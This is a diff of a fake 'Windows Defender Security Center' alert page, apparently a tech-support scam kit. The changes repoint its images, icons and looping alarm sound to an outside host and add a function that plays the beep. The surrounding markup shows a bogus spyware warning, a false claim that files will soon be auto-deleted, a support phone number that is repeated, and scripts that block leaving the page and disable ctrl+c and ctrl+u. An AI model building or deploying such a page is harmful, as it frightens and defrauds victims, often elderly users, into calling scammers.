@@ -6,7 +6,7 @@
 <title>Windows Support Assistance Er02Df87</title>
 <link rel="stylesheet" href="styles.css">
 <script type="text/javascript" src="scripts.js"></script>
-<link rel="icon" type="image/png" sizes="32x32" href="def.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://alovefromtheoven.com/fdata/def.png">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
@@ -607,7 +607,7 @@ window.onbeforeunload = function() {
 </li>
 </ul>
 </div>
-<img src="uZbx-si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+<img src="https://alovefromtheoven.com/fdata/uZbx-si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
 <br>
 </div>
 
@@ -616,7 +616,7 @@ window.onbeforeunload = function() {
   <div class="top">
   <p style="font-size: 13px;  font-family: Arial, Helvetica, sans-serif;">Windows security<img src="minimize.jpeg" class="btn" style="float: right; width:115px;"></p>
   </div>
-  <h2 style="position: absolute; left: 70px; top: 60px; font-weight: 300;" id="text1"><img src="okPE-vs.png" width="25px;" style="margin-right: 10px;">Virus and threat protection</h2>
+  <h2 style="position: absolute; left: 70px; top: 60px; font-weight: 300;" id="text1"><img src="https://alovefromtheoven.com/fdata/okPE-vs.png" width="25px;" style="margin-right: 10px;">Virus and threat protection</h2>
   <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2">Device protection against threats.</p>
 
 <h3 style="position: absolute; right: 180px; top: -10px; font-weight: 300;" id="text12"><b>+1-888-836-0476 (Free Security)</b></h3>
@@ -628,7 +628,7 @@ window.onbeforeunload = function() {
 
 
 
-  <div class="flex"> <img src="-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 33px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">Current Threat</p></div>
+  <div class="flex"> <img src="https://alovefromtheoven.com/fdata/-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 33px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">Current Threat</p></div>
 
 
   <br><br>
@@ -650,7 +650,7 @@ window.onbeforeunload = function() {
 
   <li>
 
-<div class="flex"><img src="nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px; margin-top: 5px;"><p style="position: absolute; left: 35px;    bottom: 84px;    line-height: 18px;">Virus &amp; threat protection settings </p> </div>
+<div class="flex"><img src="https://alovefromtheoven.com/fdata/nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px; margin-top: 5px;"><p style="position: absolute; left: 35px;    bottom: 84px;    line-height: 18px;">Virus &amp; threat protection settings </p> </div>
 <p style="color: grey; font-size: 13px;">no action required</p>
 <p style="font-size: 13px; color: #0063c6;">Manage your settings</p>
   </li>
@@ -693,7 +693,7 @@ window.onbeforeunload = function() {
   </ul>
 
   </div>
-  <img src="uZbx-si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+  <img src="https://alovefromtheoven.com/fdata/uZbx-si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
   <br>
   </div>
   <script>
@@ -753,7 +753,7 @@ margin-top: 8px; text-align: center;">Windows Security - Spyware Alert</p>
     </div>
 </div>
 <audio id="beep" loop="">
-  <source src="_Fm7-alert.mp3" type="audio/mpeg">
+  <source src="https://alovefromtheoven.com/fdata/_Fm7-alert.mp3" type="audio/mpeg">
 </audio>
 
 <script>
@@ -772,7 +772,7 @@ rfs.call(el);
 <div id="lst" class="lst lightbox" style="display: block;">
   <div class="ilb top">
       <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
-          <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span> Windows Defender Security Center</span>
+          <span id="txtadd" class="fl title"><span class="fl ilb"><img src="https://alovefromtheoven.com/fdata/def.png" class="logo3"></span> Windows Defender Security Center</span>
           <span id="txts1" class="fl title2"><a href="#"><img src="cross.png"></a></span>
 
       </div>
@@ -789,7 +789,7 @@ rfs.call(el);
       <small>Note: If you think this Notification is by error, report immediately to Windows Support to halt the auto-deletion of files and applications from this computer. As this Computer ID is flagged and is connected over the internet Servers, files and apps deletion may start any moment.</small>
   </div>
   <div id="bottom">
-      <img id="badge" src="def.png"><span class="title3">Windows Support</span>
+      <img id="badge" src="https://alovefromtheoven.com/fdata/def.png"><span class="title3">Windows Support</span>
       <ul>
           <li>
               <a href="#">
@@ -817,7 +817,7 @@ rfs.call(el);
 
       <div class="col-md-12">
           <div class="right-foot" style="text-align: center;">
-              <span id="footertxt" style="font-weight: 700;"><img src="defender.png"> Windows </span><span style="font-weight: 700;padding-left: 5px;color: #fff;">Support Contact <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-888-836-0476 (Security Toll-Free)</span></span>
+              <span id="footertxt" style="font-weight: 700;"><img src="https://alovefromtheoven.com/fdata/defender.png"> Windows </span><span style="font-weight: 700;padding-left: 5px;color: #fff;">Support Contact <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-888-836-0476 (Security Toll-Free)</span></span>
           </div>
       </div>
       <div class="col-md-12">
@@ -928,7 +928,9 @@ return false;
 
         }
 
-
+ function playSound() {
+    document.getElementById("beep").play();
+ }
 
         // To To Disable ctrl+c, ctrl+u
 
